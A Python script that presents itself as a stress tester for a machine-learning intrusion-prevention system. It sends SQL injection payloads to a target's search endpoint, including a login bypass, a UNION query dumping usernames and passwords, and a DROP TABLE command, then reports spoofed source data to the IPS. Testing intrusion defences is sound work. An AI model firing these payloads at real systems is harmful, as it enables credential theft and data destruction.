import requests
import time
import random
import argparse

# Argument Parsing
parser = argparse.ArgumentParser(description="IPS Stress Tester - Web Attack")
parser.add_argument("target", help="Target IP address")
parser.add_argument("--bot-count", type=int, default=1, help="Number of virtual sources")
args = parser.parse_args()

target_ip = args.target
bot_count = args.bot_count

SEARCH_URL = f"http://{target_ip}:6000/search"
IPS_URL = f"http://{target_ip}:5000/predict"

def generate_ips(count):
    if count == 1: return ["10.0.5.1"]
    return [f"192.168.1.{random.randint(2, 254)}" for _ in range(count)]

attack_ips = generate_ips(bot_count)
session = requests.Session()

# SQL Injection patterns
SQL_PAYLOADS = [
    "' OR '1'='1",
    "admin' --",
    "' UNION SELECT NULL, username, password FROM users --",
    "'; DROP TABLE users; --",
    "1' ORDER BY 1--",
    "' AND 1=1--"
]

def run_web_attack():
    print(f"💉 Starting Distributed Web Attack against {target_ip}...")
    
    for i, payload in enumerate(SQL_PAYLOADS):
        # Rotate source IP
        src_ip = attack_ips[i % len(attack_ips)]
        try:
            # 1. Real SQLi attempt
            session.get(SEARCH_URL, params={"q": payload}, timeout=5.0)
            
            # 2. Inform IPS
            ips_payload = {
                "ip": src_ip,
                "request_rate": random.randint(10, 50),
                "failed_logins": 0,
                "packet_size": random.randint(1500, 4000),
                "duration": 0.2,
                "protocol": "HTTP",
                "attack_type": "Web Attack"
            }
            session.post(IPS_URL, json=ips_payload, timeout=2.0)
            print(f"[{src_ip}] Payload sent: {payload[:20]}...")
        except:
            pass
        
        time.sleep(1)

if __name__ == "__main__":
    run_web_attack()
